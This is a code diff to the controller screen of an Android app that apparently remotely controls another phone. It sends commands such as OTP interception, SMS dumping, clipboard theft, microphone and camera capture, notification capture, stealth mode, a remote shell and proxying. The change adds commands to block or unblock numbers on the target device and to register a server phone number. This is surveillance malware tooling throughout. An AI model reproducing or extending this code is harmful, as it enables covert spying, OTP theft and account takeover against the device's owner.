@@ -409,11 +409,15 @@ class ControlDeviceActivity : AppCompatActivity() {
             "Send SMS",
             "Start Listening for OTP",
             "Stop Listening for OTP",
-            "Get SMSes",
+            "Get Last Received SMSes",
             "Dump SMSes to File",
             "Get Clipboard Content",
             "Copy to Clipboard",
             "Get Last Called Phone Numbers",
+            "Block Phone Number",
+            "Unblock Phone Number",
+            "Get All Blocked Phone Numbers",
+            "Clear All Blocked Phone Numbers",
             "Start Recording Audio from Mic",
             "Stop Recording Audio from Mic",
             "Switch to Camera",
@@ -454,6 +458,7 @@ class ControlDeviceActivity : AppCompatActivity() {
             "End Call",
             "Accept Ringing Call",
             "Set Display Brightness",
+            "Add Server Phone Number",
             "Connect using SMS",
             "Connect using Internet",
             "Send Custom Command",
@@ -1147,6 +1152,7 @@ class ControlDeviceActivity : AppCompatActivity() {
                         )
                         binding.button.text = "Get Phone Numbers"
                         binding.editText.hint = "Count"
+                        binding.editText.inputType = EditorInfo.TYPE_CLASS_NUMBER
                         binding.button.setOnClickListener {
                             val count = binding.editText.text.toString()
                             if (!isInteger(count)) {
@@ -1163,6 +1169,72 @@ class ControlDeviceActivity : AppCompatActivity() {
                     }
                 }
                 53 -> {
+                    if (!isUsingSMS) {
+                        val dialog = Dialog(this)
+                        val binding = LayoutDialogBinding.inflate(LayoutInflater.from(this))
+                        dialog.setContentView(binding.root)
+                        dialog.window?.setLayout(
+                            ViewGroup.LayoutParams.MATCH_PARENT,
+                            ViewGroup.LayoutParams.WRAP_CONTENT
+                        )
+                        binding.button.text = "Block Phone Number"
+                        binding.editText.hint = "Phone Number"
+                        binding.editText.inputType = EditorInfo.TYPE_CLASS_PHONE
+                        binding.button.setOnClickListener {
+                            val phoneNo = binding.editText.text.toString()
+                            if (phoneNo.isEmpty()) {
+                                binding.editText.error = "Please enter a phone number"
+                                return@setOnClickListener
+                            }
+                            sendCommandByFirestore("BLOCK_PHONE_NUMBER $phoneNo")
+                            dialog.dismiss()
+                        }
+                        // Show the dialog
+                        dialog.show()
+                    } else {
+                        Toast.makeText(this, "BLOCK_PHONE_NUMBER: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
+                    }
+                }
+                54 -> {
+                    if (!isUsingSMS) {
+                        val dialog = Dialog(this)
+                        val binding = LayoutDialogBinding.inflate(LayoutInflater.from(this))
+                        dialog.setContentView(binding.root)
+                        dialog.window?.setLayout(
+                            ViewGroup.LayoutParams.MATCH_PARENT,
+                            ViewGroup.LayoutParams.WRAP_CONTENT
+                        )
+                        binding.button.text = "Unblock Phone Number"
+                        binding.editText.hint = "Phone Number"
+                        binding.editText.inputType = EditorInfo.TYPE_CLASS_PHONE
+                        binding.button.setOnClickListener {
+                            val phoneNo = binding.editText.text.toString()
+                            if (phoneNo.isEmpty()) {
+                                binding.editText.error = "Please enter a phone number"
+                                return@setOnClickListener
+                            }
+                            sendCommandByFirestore("UNBLOCK_PHONE_NUMBER $phoneNo")
+                            dialog.dismiss()
+                        }
+                        // Show the dialog
+                        dialog.show()
+                    } else {
+                        Toast.makeText(this, "UNBLOCK_PHONE_NUMBER: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
+                    }
+                }
+                55 -> {
+                    if (!isUsingSMS)
+                        sendCommandByFirestore("GET_ALL_BLOCKED_NUMBERS")
+                    else
+                        Toast.makeText(this, "GET_ALL_BLOCKED_NUMBERS: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
+                }
+                56 -> {
+                    if (!isUsingSMS)
+                        sendCommandByFirestore("CLEAR_ALL_BLOCKED_NUMBERS")
+                    else
+                        Toast.makeText(this, "CLEAR_ALL_BLOCKED_NUMBERS: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
+                }
+                57 -> {
                     if (!isUsingSMS) {
                         val dialog = Dialog(this)
                         val binding = LayoutDialogBinding.inflate(LayoutInflater.from(this))
@@ -1189,13 +1261,13 @@ class ControlDeviceActivity : AppCompatActivity() {
                         Toast.makeText(this, "START_RECORDING_AUDIO_FROM_MIC: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
                     }
                 }
-                54 -> {
+                58 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("STOP_RECORDING_AUDIO_FROM_MIC")
                     else
                         Toast.makeText(this, "STOP_RECORDING_AUDIO_FROM_MIC: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
                 }
-                55 -> {
+                59 -> {
                     if (!isUsingSMS) {
                         val dialog = Dialog(this)
                         val binding = LayoutDialogBinding.inflate(LayoutInflater.from(this))
@@ -1222,7 +1294,7 @@ class ControlDeviceActivity : AppCompatActivity() {
                         Toast.makeText(this, "SWITCH_TO_CAMERA: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
                     }
                 }
-                56 -> {
+                60 -> {
                     if (!isUsingSMS) {
                         val dialog = Dialog(this)
                         val binding = LayoutDialogBinding.inflate(LayoutInflater.from(this))
@@ -1249,50 +1321,50 @@ class ControlDeviceActivity : AppCompatActivity() {
                         Toast.makeText(this, "CLICK_IMAGE: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
                     }
                 }
-                57 -> {
+                61 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("GET_SPEED")
                     else
                         sendCommandBySMS("GET_SPEED")
                 }
-                58 -> {
+                62 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("GET_DEVICE_HEADING")
                     else
                         sendCommandBySMS("GET_DEVICE_HEADING")
                 }
-                59 -> {
+                63 -> {
                     Toast.makeText(this, "This is incomplete!", Toast.LENGTH_SHORT).show()
 //                    Intent(this, BLEDistanceTrackingActivity::class.java).also { intent ->
 //                        intent.putExtra("DeviceID", currentDeviceID)
 //                        startActivity(intent)
 //                    }
                 }
-                60 -> {
+                64 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("GET_INSTALLED_APPS")
                     else
                         Toast.makeText(this, "GET_INSTALLED_APPS: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
                 }
-                61 -> {
+                65 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("CLICK_HOME")
                     else
                         Toast.makeText(this, "CLICK_HOME: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
                 }
-                62 -> {
+                66 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("CLICK_BACK")
                     else
                         Toast.makeText(this, "CLICK_HOME: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
                 }
-                63 -> {
+                67 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("CLICK_RECENTS")
                     else
                         Toast.makeText(this, "CLICK_HOME: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
                 }
-                64 -> {
+                68 -> {
                     if (!isUsingSMS) {
                         val dialog = Dialog(this)
                         val binding = LayoutDialogBinding.inflate(LayoutInflater.from(this))
@@ -1313,7 +1385,7 @@ class ControlDeviceActivity : AppCompatActivity() {
                         Toast.makeText(this, "SET_FOCUSED_VIEW_TEXT: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
                     }
                 }
-                65 -> {
+                69 -> {
                     if (!isUsingSMS) {
                         val dialog = Dialog(this)
                         val binding = LayoutDialogBinding.inflate(LayoutInflater.from(this))
@@ -1339,7 +1411,7 @@ class ControlDeviceActivity : AppCompatActivity() {
                         ).show()
                     }
                 }
-                66 -> {
+                70 -> {
                     if (!isUsingSMS) {
                         val dialog = Dialog(this)
                         val binding = LayoutDialogBinding.inflate(LayoutInflater.from(this))
@@ -1365,7 +1437,7 @@ class ControlDeviceActivity : AppCompatActivity() {
                         ).show()
                     }
                 }
-                67 -> {
+                71 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("CLEAR_APPS_TO_PREVENT_OPENING")
                     else
@@ -1375,7 +1447,7 @@ class ControlDeviceActivity : AppCompatActivity() {
                             Toast.LENGTH_SHORT
                         ).show()
                 }
-                68 -> {
+                72 -> {
                     AlertDialog.Builder(this)
                         .setTitle("Confirm Enable Stealth Mode")
                         .setMessage("Are you sure you want to enable stealth mode?")
@@ -1388,7 +1460,7 @@ class ControlDeviceActivity : AppCompatActivity() {
                         }
                         .show()
                 }
-                69 -> {
+                73 -> {
                     AlertDialog.Builder(this)
                         .setTitle("Confirm Disable Stealth Mode")
                         .setMessage("Are you sure you want to disable stealth mode?")
@@ -1401,7 +1473,7 @@ class ControlDeviceActivity : AppCompatActivity() {
                         }
                         .show()
                 }
-                70 -> {
+                74 -> {
                     val dialog = Dialog(this)
                     val binding = LayoutDialogBinding.inflate(LayoutInflater.from(this))
                     dialog.setContentView(binding.root)
@@ -1419,12 +1491,12 @@ class ControlDeviceActivity : AppCompatActivity() {
                     // Show the dialog
                     dialog.show()
                 }
-                71 -> {
+                75 -> {
                     Intent(this, VirtualShellActivity::class.java).also {
                         startActivity(it)
                     }
                 }
-                72 -> {
+                76 -> {
                     val dialog = Dialog(this)
                     val binding = LayoutDialogBinding.inflate(LayoutInflater.from(this))
                     dialog.setContentView(binding.root)
@@ -1446,7 +1518,7 @@ class ControlDeviceActivity : AppCompatActivity() {
                     // Show the dialog
                     dialog.show()
                 }
-                73 -> {
+                77 -> {
                     val dialog = Dialog(this)
                     val binding = LayoutDialogBinding.inflate(LayoutInflater.from(this))
                     dialog.setContentView(binding.root)
@@ -1473,31 +1545,31 @@ class ControlDeviceActivity : AppCompatActivity() {
                     // Show the dialog
                     dialog.show()
                 }
-                74 -> {
+                78 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("SET_INTERRUPTION_FILTER INTERRUPTION_FILTER_NONE")
                     else
                         Toast.makeText(this, "SET_INTERRUPTION_FILTER: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
                 }
-                75 -> {
+                79 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("SET_INTERRUPTION_FILTER INTERRUPTION_FILTER_ALL")
                     else
                         Toast.makeText(this, "SET_INTERRUPTION_FILTER: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
                 }
-                76 -> {
+                80 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("GET_ALL_CAPTURED_NOTIFICATIONS")
                     else
                         Toast.makeText(this, "GET_ALL_CAPTURED_NOTIFICATIONS: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
                 }
-                77 -> {
+                81 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("CLEAR_ALL_CAPTURED_NOTIFICATIONS")
                     else
                         Toast.makeText(this, "CLEAR_ALL_CAPTURED_NOTIFICATIONS: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
                 }
-                78 -> {
+                82 -> {
                     if (!isUsingSMS) {
                         val dialog = Dialog(this)
                         val binding = LayoutDialogBinding.inflate(LayoutInflater.from(this))
@@ -1521,7 +1593,7 @@ class ControlDeviceActivity : AppCompatActivity() {
                         Toast.makeText(this, "OPEN_URI: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
                     }
                 }
-                79 -> {
+                83 -> {
                     if (!isUsingSMS) {
                         val dialog = Dialog(this)
                         val binding = LayoutDialogBinding.inflate(LayoutInflater.from(this))
@@ -1544,19 +1616,19 @@ class ControlDeviceActivity : AppCompatActivity() {
                         Toast.makeText(this, "OPEN_APP2: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
                     }
                 }
-                80 -> {
+                84 -> {
                     if (!isUsingSMS)
                         Toast.makeText(this, "RESTART_SERVICE: Function not available when connected using internet", Toast.LENGTH_SHORT).show()
                     else
                         sendCommandBySMS("RESTART_SERVICE")
                 }
-                81 -> {
+                85 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("STOP_SERVICE")
                     else
                         sendCommandBySMS("STOP_SERVICE")
                 }
-                82 -> {
+                86 -> {
                     if (!isWifiP2pConnected) {
                         if (!isUsingSMS)
                             sendCommandByFirestore("START_WIFI_P2P_SERVER")
@@ -1566,19 +1638,19 @@ class ControlDeviceActivity : AppCompatActivity() {
                         Toast.makeText(this, "WIFI P2P connection is already active with $wifiP2pConnectedDeviceID", Toast.LENGTH_SHORT).show()
                     }
                 }
-                83 -> {
+                87 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("STOP_WIFI_P2P_SERVER")
                     else
                         sendCommandBySMS("STOP_WIFI_P2P_SERVER")
                 }
-                84 -> {
+                88 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("WIFI_P2P_GET_HOST_ADDRESS")
                     else
                         sendCommandBySMS("WIFI_P2P_GET_HOST_ADDRESS")
                 }
-                85 -> {
+                89 -> {
                     val dialog = Dialog(this)
                     val binding = LayoutDialogBinding.inflate(LayoutInflater.from(this))
                     dialog.setContentView(binding.root)
@@ -1602,25 +1674,25 @@ class ControlDeviceActivity : AppCompatActivity() {
                     // Show the dialog
                     dialog.show()
                 }
-                86 -> {
+                90 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("STOP_HTTP_PROXY")
                     else
                         sendCommandBySMS("STOP_HTTP_PROXY")
                 }
-                87 -> {
+                91 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("START_SOCKS5_PROXY")
                     else
                         sendCommandBySMS("START_SOCKS5_PROXY")
                 }
-                88 -> {
+                92 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("STOP_SOCKS5_PROXY")
                     else
                         sendCommandBySMS("STOP_SOCKS5_PROXY")
                 }
-                89 -> {
+                93 -> {
                     if (!isUsingSMS) {
                         startActivity(Intent(this, Socks5ProxySettingsActivity::class.java).apply {
                             putExtra("DeviceID", currentDeviceID)
@@ -1629,19 +1701,19 @@ class ControlDeviceActivity : AppCompatActivity() {
                         Toast.makeText(this, "SET_SOCKS5_PROXY_SETTINGS: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
                     }
                 }
-                90 -> {
+                94 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("END_CALL")
                     else
                         sendCommandBySMS("END_CALL")
                 }
-                91 -> {
+                95 -> {
                     if (!isUsingSMS)
                         sendCommandByFirestore("ACCEPT_RINGING_CALL")
                     else
                         sendCommandBySMS("ACCEPT_RINGING_CALL")
                 }
-                92 -> {
+                96 -> {
                     if (!isUsingSMS) {
                         val dialog = Dialog(this)
                         val binding = LayoutDialogBinding.inflate(LayoutInflater.from(this))
@@ -1665,7 +1737,31 @@ class ControlDeviceActivity : AppCompatActivity() {
                         Toast.makeText(this, "SET_DISPLAY_BRIGHTNESS: Function not available when connected using SMS", Toast.LENGTH_SHORT).show()
                     }
                 }
-                93 -> {
+                97 -> {
+                    val dialog = Dialog(this)
+                    val binding = LayoutDialogBinding.inflate(LayoutInflater.from(this))
+                    dialog.setContentView(binding.root)
+                    dialog.window?.setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
+                    binding.button.text = "Add Server Phone Number"
+                    binding.editText.hint = "Server Phone Number"
+                    binding.editText.inputType = EditorInfo.TYPE_CLASS_PHONE
+                    binding.button.setOnClickListener {
+                        val phoneNo = binding.editText.text.toString()
+                        if (phoneNo.isEmpty()) {
+                            binding.editText.error = "Please enter a phone number"
+                            return@setOnClickListener
+                        }
+                        if (!isUsingSMS) {
+                            sendCommandByFirestore("ADD_SERVER_PHONE_NO $phoneNo")
+                        } else {
+                            sendCommandBySMS("ADD_SERVER_PHONE_NO $phoneNo")
+                        }
+                        dialog.dismiss()
+                    }
+                    // Show the dialog
+                    dialog.show()
+                }
+                98 -> {
                     val dialog = Dialog(this)
                     val binding2 = LayoutDialogBinding.inflate(LayoutInflater.from(this))
                     dialog.setContentView(binding2.root)
@@ -1728,11 +1824,11 @@ class ControlDeviceActivity : AppCompatActivity() {
                     // Show the dialog
                     dialog.show()
                 }
-                94 -> {
+                99 -> {
                     isUsingSMS = false
                     binding.connectedByView.text = "Connected By: Internet"
                 }
-                95 -> {
+                100 -> {
                     val dialog = Dialog(this)
                     val binding = LayoutDialogBinding.inflate(LayoutInflater.from(this))
                     dialog.setContentView(binding.root)
@@ -1750,7 +1846,7 @@ class ControlDeviceActivity : AppCompatActivity() {
                     // Show the dialog
                     dialog.show()
                 }
-                96 -> {
+                101 -> {
                     Intent(this, CommandHistoryActivity::class.java).also {
                         it.putExtra("DeviceID", currentDeviceID)
                         startActivity(it)
